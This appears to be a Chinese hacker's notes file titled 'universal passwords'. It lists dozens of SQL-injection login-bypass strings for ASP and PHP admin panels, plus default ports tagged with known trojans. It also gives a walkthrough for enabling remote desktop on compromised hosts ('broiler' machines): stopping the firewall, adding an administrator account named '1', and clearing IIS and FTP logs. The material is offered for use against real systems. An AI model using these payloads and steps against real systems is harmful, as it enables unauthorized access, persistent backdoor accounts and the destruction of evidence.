# wan-nen-mima
万能密码
所谓万能密码就是绕过登录验证直接进入管理员后台的密码，这种类型的密码可以通用到很多存在此漏洞的网站所以称之为万能。
分享给大家、、 希望对大家有所帮助！
asp aspx万能密码
1："or "a"="a
2：'.).or.('.a.'='.a 
3：or 1=1--
4：'or 1=1--
5：a'or' 1=1--
6："or 1=1--
7：'or.'a.'='a
8："or"="a'='a
9：'or''='
10：'or'='or'
admin'or 1=1#
PHP万能密码
admin'/*
密码*/'
'or 1=1/*
"or "a"="a
"or 1=1--
"or"="
"or"="a'='a
"or1=1--
"or=or"
''or'='or'
') or ('a'='a
'.).or.('.a.'='.a
'or 1=1
'or 1=1--
'or 1=1/*
'or"="a'='a
'or' '1'='1'
'or''='
'or''=''or''='
'or'='1'
'or'='or'
'or.'a.'='a
'or1=1--
1'or'1'='1
a'or' 1=1--
a'or'1=1--
or 'a'='a'
or 1=1--
or1=1--
通过该工具可以扫描常用的端口和指定的端口是否开放。 
常用端口号：
代理服务器常用以下端口：
（1）. HTTP协议代理服务器常用端口号：80/8080/3128/8081/9080
（2）. SOCKS代理协议服务器常用端口号：1080
（3）. FTP（文件传输）协议代理服务器常用端口号：21
（4）. Telnet（远程登录）协议代理服务器常用端口：23
 
HTTP服务器，默认的端口号为80/tcp（木马Executor开放此端口）；
HTTPS（securely transferring web pages）服务器，默认的端口号为443/tcp 443/udp；
Telnet（不安全的文本传送），默认端口号为23/tcp（木马Tiny Telnet Server所开放的端口）；
FTP，默认的端口号为21/tcp（木马Doly Trojan、Fore、Invisible FTP、WebEx、WinCrash和Blade Runner所开放的端口）；
TFTP（Trivial File Transfer Protocol ），默认的端口号为69/udp；
SSH（安全登录）、SCP（文件传输）、端口重定向，默认的端口号为22/tcp；
SMTP Simple Mail Transfer Protocol (E-mail)，默认的端口号为25/tcp（木马Antigen、Email Password Sender、Haebu Coceda、Shtrilitz Stealth、WinPC、WinSpy都开放这个端口）；
POP3 Post Office Protocol (E-mail) ，默认的端口号为110/tcp；
WebLogic，默认的端口号为7001；
Webshpere应用程序，默认的端口号为9080；
webshpere管理工具，默认的端口号为9090；
JBOSS，默认的端口号为8080；
TOMCAT，默认的端口号为8080；
WIN2003远程登陆，默认的端口号为3389；
Symantec AV/Filter for MSE ,默认端口号为 8081；
Oracle 数据库，默认的端口号为1521；
ORACLE EMCTL，默认的端口号为1158；
Oracle XDB（ XML 数据库），默认的端口号为8080；
Oracle XDB FTP服务，默认的端口号为2100；
MS SQL*SERVER数据库server，默认的端口号为1433/tcp 1433/udp；
MS SQL*SERVER数据库monitor，默认的端口号为1434/tcp 1434/udp；
QQ，默认的端口号为1080/udp
XP下双开3389的教程
用到的工具有 
xp3389.exe  termsrvhack.dll  3389.bat 这么几个文件
首先关他的防火墙
就在这里面输入   net stop sharedaccess  再回车就OK了
现在我们先把xp3389.exe  termsrvhack.dll这2个文件传个肉鸡  3389.bat这个要修该后再传的
再运行它。看操作
OK! the Tsenabled成功
再输入Tasklist/SVC >>c:\3389.txt
再肉鸡里面找到3389.txt文件本地打开DcomLaunch, TermService  把这些英文前面的数字记下来
然后返回本地找到  3389.bat
右键编辑  把原来的覆盖掉  保持OK  再传给肉鸡  并运行他
已经OK了。好我们看下能不能连接
  
1：net stop sharedaccess(关掉防火墙命令)
              2：Tasklist/SVC >>c:\3389.txt
              3：net user 1 1 /add 意思是建立一下用户名为1密码也为1的用户
              4：net localgroup administrators 1 /add 把１这个用户提升为管理员权限
日志位于/windows/system32/logfiles/w3svc1目录下!
    主要原因：
     C:\WINDOWS\system32\LogFiles文件夹下为系统日志统计文件,文件系统并不自动删除。
    处理方法：对日志文件进行合理的清理。    
    清理方法如下：
    找到c:/winnt/system32/logfiles/w3svc1目录下的文件，队保留最近的几个日志外，清理干净就可以了！！
    FTP日志默认位置：%systemroot%\system32\logfiles\msftpsvc1\，默认每天一个。
    WWW日志默认位置：%systemroot%\system32\logfiles\w3svc1\，默认每天一个日志。
强制登陆3389
mstsc /admin /v:IP:端口

